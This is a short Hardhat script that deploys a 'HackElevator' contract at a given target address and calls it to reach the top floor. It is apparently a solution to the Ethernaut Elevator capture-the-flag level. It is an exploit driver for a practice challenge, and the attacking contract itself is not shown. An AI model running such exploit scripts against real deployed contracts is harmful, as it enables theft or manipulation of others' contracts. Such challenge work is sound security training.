const main = async () => {
  const hackElevatorFactory = await hre.ethers.getContractFactory("HackElevator");
  const hackElevator = await hackElevatorFactory.deploy("0xB59c48a817D7bA1d410F79a162289c8de9476Cdc");
  await hackElevator.deployed();
  console.log("Contract deployed to: " + hackElevator.address);

  let txn = await hackElevator.getToLastFloor();
  console.log("Going to floor 0...");
  await txn.wait();
  console.log("You have arrived at floor 0");

  let txn2 = await hackElevator.isLastFloor(0);
  console.log("Is this the last floor...?");
  await txn2.wait();
  console.log(`${hackElevator.top()}`);

}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
